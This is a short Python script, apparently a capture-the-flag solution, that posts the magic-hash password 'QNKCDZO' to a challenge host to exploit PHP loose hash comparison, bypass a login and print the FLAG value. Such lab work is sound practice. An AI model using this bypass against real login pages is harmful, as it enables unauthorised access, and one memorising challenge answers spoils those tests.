#!/usr/bin/env python3
import sys
import re
import urllib.request
import urllib.parse


def fetch(url: str) -> str:
    data = urllib.parse.urlencode({"password": "QNKCDZO"}).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117 Safari/537.36"
        },
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        content = resp.read()
        try:
            return content.decode("utf-8", errors="ignore")
        except Exception:
            return content.decode("latin-1", errors="ignore")


def extract_flag(html: str) -> str:
    m = re.search(r"FLAG\{[^}]+\}", html)
    return m.group(0) if m else ""


def main():
    # Default challenge URL; you can override by passing a URL as argv[1]
    base = "http://ip32822/"
    url = sys.argv[1] if len(sys.argv) > 1 else base

    # Try given URL, then fall back to /index.php if needed
    tried = []
    for candidate in [url, url.rstrip("/") + "/index.php"]:
        if candidate in tried:
            continue
        tried.append(candidate)
        try:
            html = fetch(candidate)
        except Exception as e:
            continue
        flag = extract_flag(html)
        if flag:
            print(flag)
            return

    print("[!] Flag not found. If the server/port changed, pass the URL as an argument.")
    print("    Example: python3 exp.py http://HOST:PORT/")


if __name__ == "__main__":
    main()

